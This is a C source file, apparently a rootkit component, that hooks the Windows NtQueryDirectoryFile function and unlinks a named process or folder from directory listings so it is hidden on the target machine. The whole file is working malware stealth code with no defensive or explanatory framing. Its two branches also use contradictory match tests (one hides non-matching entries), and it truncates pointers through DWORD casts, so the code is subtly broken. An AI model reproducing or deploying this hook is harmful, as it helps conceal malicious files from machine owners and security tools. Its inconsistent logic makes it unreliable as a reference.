#include "FileHider.h"

NTSTATUS WINAPI NewNtQueryDirectoryFile(HANDLE FileHandle,
	HANDLE Event,
	PIO_APC_ROUTINE ApcRoutine,
	PVOID ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID FileInformation,
	ULONG Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN ReturnSingleEntry,
	PUNICODE_STRING FileName,
	BOOLEAN RestartScan
) {

	char infobuf[4096];
	ULONG ResultLength = 0;
	NtQueryObject(FileHandle, ObjectNameInformation, infobuf, sizeof(infobuf), &ResultLength);
	OBJECT_NAME_INFORMATION * pinfo = (OBJECT_NAME_INFORMATION *)infobuf;
	wchar_t * ps = pinfo->NameBuffer;
	ps[pinfo->Name.Length / 2] = 0;
	NTSTATUS result = TrueNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length,
		FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	if ((FileInformationClass == FileBothDirectoryInformation || FileInformationClass == FileIdBothDirectoryInformation) && result == STATUS_SUCCESS) {
		if (lstrcmpi(ps, diskName) == 0) {
			if (FileInformationClass == FileBothDirectoryInformation) {
				PFILE_BOTH_DIR_INFORMATION Prev, info = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
				UINT cnt = 0;
				while (info->NextEntryOffset>0) {
					Prev = info;
					info = (PFILE_BOTH_DIR_INFORMATION)((DWORD)info + (DWORD)info->NextEntryOffset);
					UINT bl;
					if (folderName[0] == 0) bl = lstrcmp(info->FileName, nameProcess); else bl = lstrcmp(info->FileName, folderName);
					if (bl) {

						if (info->NextEntryOffset == 0) {
							Prev->NextEntryOffset = 0;
							Prev->FileIndex = info->FileIndex;
							if (cnt == 0) return STATUS_NO_SUCH_FILE;
						}
						else {
							Prev->NextEntryOffset = Prev->NextEntryOffset + info->NextEntryOffset;
							Prev->FileIndex = info->FileIndex;
						}
					}

					cnt++;
				}
			}
			else {
				PFILE_ID_BOTH_DIR_INFORMATION Prev, info = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
				UINT cnt = 0;
				while (info->NextEntryOffset>0) {
					Prev = info;
					info = (PFILE_ID_BOTH_DIR_INFORMATION)((DWORD)info + (DWORD)info->NextEntryOffset);
					UINT bl;
					if (folderName[0] == 0) bl = lstrcmp(info->FileName, nameProcess); else bl = lstrcmp(info->FileName, folderName);
					if (!bl) {

						if (info->NextEntryOffset == 0) {
							Prev->NextEntryOffset = 0;
							Prev->FileIndex = info->FileIndex;
							if (cnt == 0) return STATUS_NO_SUCH_FILE;
						}
						else {
							Prev->NextEntryOffset = Prev->NextEntryOffset + info->NextEntryOffset;
							Prev->FileIndex = info->FileIndex;
						}
					}

					cnt++;
				}
			}


		}
	}
	return result;

}